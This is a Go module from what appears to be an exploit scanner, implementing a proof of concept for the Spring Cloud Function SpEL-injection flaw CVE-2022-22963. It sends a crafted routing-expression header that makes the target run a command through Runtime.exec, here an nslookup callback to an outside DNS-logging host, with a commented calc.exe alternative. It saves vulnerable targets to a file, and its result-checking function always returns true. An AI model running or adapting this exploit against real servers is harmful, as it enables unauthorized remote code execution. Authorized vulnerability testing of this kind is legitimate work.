package _022

import (
	req2 "github.com/SummerSec/SpringExploit/cmd/commons/req"
	"github.com/SummerSec/SpringExploit/cmd/commons/utils"
	"github.com/fatih/structs"
	"github.com/imroc/req/v3"
	log "github.com/sirupsen/logrus"
)

type CVE202222963 struct{}

func (p CVE202222963) SendPoc(target string, hashmap map[string]interface{}) {

	reqinfo := req2.NewReqInfo()
	reqmap := structs.Map(reqinfo)
	url := target + "functionRouter"
	reqmap["url"] = url
	reqmap["method"] = "POST"
	dnslog := &utils.Dnslog{}
	dnslog.SetId("CVE-2022-22963")
	ranStr := dnslog.Id()
	dnslog.SetPre("dns")
	cmd := "nslookup " + ranStr + ".skysa.eyes.sh"
	//cmd := "calc.exe"
	log.Debugln(cmd)
	payload := "T(java.lang.Runtime).getRuntime().exec(\"" + cmd + "\")"
	//payload := "T(java.net.InetAddress).getByName(\"" + ranStr + ".skysa.eyes.sh\")"
	log.Debugf("payload: %s", payload)
	log.Debugf("dnslog: %s", dnslog)

	reqmap["timeout"] = hashmap["Timeout"].(int)
	reqmap["retry"] = hashmap["Retry"].(int)
	reqmap["proxy"] = hashmap["Proxy"].(string)
	reqmap["mode"] = hashmap["Mode"].(int)
	reqmap["headers"] = map[string]string{
		"User-Agent":   utils.GetUA(),
		"Content-Type": "application/x-www-form-urlencoded",
		//"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
		"spring.cloud.function.routing-expression": payload,
	}

	reqmap["method"] = "POST"
	reqmap["body"] = ranStr
	// 发送请求
	resp := utils.Send(reqmap)

	res := dnslog.GetDnslog()
	if res {
		if p.CheckExp(resp, target, hashmap["Out"].(string)) {
			log.Infof("[+] %s: %s", target, "CVE-2022-22963")
			p.SaveResult(target, hashmap["Out"].(string))
		}
	}

}

func (CVE202222963) init() {
	log.Debugf("CVE-2022-22963 init")

}

func (CVE202222963) SaveResult(target string, file string) {
	context := target + "   存在CVE-2022-22963漏洞\n"
	utils.SaveToFile(context, file)
}

func (p CVE202222963) CheckExp(resp *req.Response, dnslog string, file string) bool {
	log.Debugf("CVE-2022-22963 checkExp")
	return true

}
